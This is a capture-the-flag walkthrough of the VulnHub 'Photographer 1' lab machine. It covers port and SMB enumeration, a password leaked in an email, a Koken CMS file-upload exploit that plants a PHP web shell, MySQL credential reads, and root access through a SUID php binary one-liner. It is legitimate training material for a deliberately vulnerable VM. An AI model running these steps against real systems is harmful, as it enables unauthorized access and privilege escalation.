
# Description

<https://www.vulnhub.com/entry/photographer-1,519/>

This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.


# Scan ports

    └─$ sudo nmap -sT -A -Pn -n 192.168.110.59
    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-26 15:09 CEST
    Nmap scan report for 192.168.110.59
    Host is up (0.00012s latency).
    Not shown: 996 closed ports
    PORT     STATE SERVICE     VERSION
    80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Photographer by v1n1v131r4
    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
    |_http-generator: Koken 0.22.24
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: daisa ahomi
    MAC Address: 08:00:27:40:5C:B0 (Oracle VirtualBox virtual NIC)
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: Host: PHOTOGRAPHER

    Host script results:
    |_clock-skew: mean: 1h19m57s, deviation: 2h18m33s, median: -2s
    |_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | smb-os-discovery: 
    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
    |   Computer name: photographer
    |   NetBIOS computer name: PHOTOGRAPHER\x00
    |   Domain name: \x00
    |   FQDN: photographer
    |_  System time: 2021-10-26T09:09:41-04:00
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2021-10-26T13:09:42
    |_  start_date: N/A

    TRACEROUTE
    HOP RTT     ADDRESS
    1   0.12 ms 192.168.110.59

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 15.63 seconds

# Scan samba service

    $ enum4linux 192.168.110.59

     =========================================== 
    |    Share Enumeration on 192.168.110.59    |
     =========================================== 

            Sharename       Type      Comment
            ---------       ----      -------
            print$          Disk      Printer Drivers
            sambashare      Disk      Samba on Ubuntu
            IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))


    S-1-22-1-1000 Unix User\daisa (Local User)
    S-1-22-1-1001 Unix User\agi (Local User)

## Download smb share

    └─$ smbclient //192.168.110.59/sambashare

    smb: \> mget *

    cat mail.txt

    Message-ID: <4129F3CA.2020509@dc.edu>
    Date: Mon, 20 Jul 2020 11:40:36 -0400
    From: Agi Clarence <agi@photographer.com>
    User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
    X-Accept-Language: en-us, en
    MIME-Version: 1.0
    To: Daisa Ahomi <daisa@photographer.com>
    Subject: To Do - Daisa Website's
    Content-Type: text/plain; charset=us-ascii; format=flowed
    Content-Transfer-Encoding: 7bit

    Hi Daisa!
    Your site is ready now.
    Don't forget your secret, my babygirl ;)

# Scan port 8000

    └─$ nikto -h 192.168.110.59 -port 8000
    - Nikto v2.1.6
    ---------------------------------------------------------------------------
    + Target IP:          192.168.110.59
    + Target Hostname:    192.168.110.59
    + Target Port:        8000
    + Start Time:         2021-10-29 11:13:32 (GMT2)
    ---------------------------------------------------------------------------
    + Server: Apache/2.4.18 (Ubuntu)
    + The anti-clickjacking X-Frame-Options header is not present.
    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
    + Uncommon header 'x-koken-cache' found, with contents: hit
    + All CGI directories 'found', use '-C none' to test none
    + Server may leak inodes via ETags, header found with file /, inode: 1264, size: 5cf45b17a5a00, mtime: gzip
    + Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
    + Uncommon header 'x-xhr-current-location' found, with contents: http://192.168.110.59/
    + Web Server returns a valid response with junk HTTP methods, this may cause false positives.
    + DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
    + OSVDB-3092: /admin/: This might be interesting...
    + OSVDB-3092: /app/: This might be interesting...
    + OSVDB-3092: /home/: This might be interesting...
    + OSVDB-3233: /icons/README: Apache default file found.
    + /admin/index.html: Admin login page/section found.
    + /server-status: Apache server-status interface found (protected/forbidden)
    + 26547 requests: 0 error(s) and 15 item(s) reported on remote host
    + End Time:           2021-10-29 11:15:09 (GMT2) (97 seconds)
    ---------------------------------------------------------------------------
    + 1 host(s) tested



# Found login password to koken

    daisa@photographer.com : babygirl

# Search sploit and upload shell
    
    $ searchsploit koken 
    $ searchsploit -m php/webapps/48706.txt

# Reversehell

    http://192.168.110.59:8000/storage/originals/ef/7a/shell.php

# Exploit

    $ cat /home/daisa/user.txt
    d41d8cd98f00b204e9800998ecf8427e

    $ cat ./storage/configuration/database.php
    <?php
            return array(
                    'hostname' => 'localhost',
                    'database' => 'koken',
                    'username' => 'kokenuser',
                    'password' => 'user_password_here',
                    'prefix' => 'koken_',
                    'socket' => ''
            );
    $

    mysql -ukokenuser -puser_password_here -hlocalhost koken -e "show tables" 2>&1
    mysql -ukokenuser -puser_password_here -hlocalhost koken -e "select * from koken_users" 2>&1

    $ find / -perm -u=s -type f -ls 2>/dev/null
     3901509   4772 -rwsr-xr-x   1 root     root        4883680 Jul  9  2020 /usr/bin/php7.2
     

    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    $ php -r "pcntl_exec('/bin/sh', ['-p']);"
    id
    uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
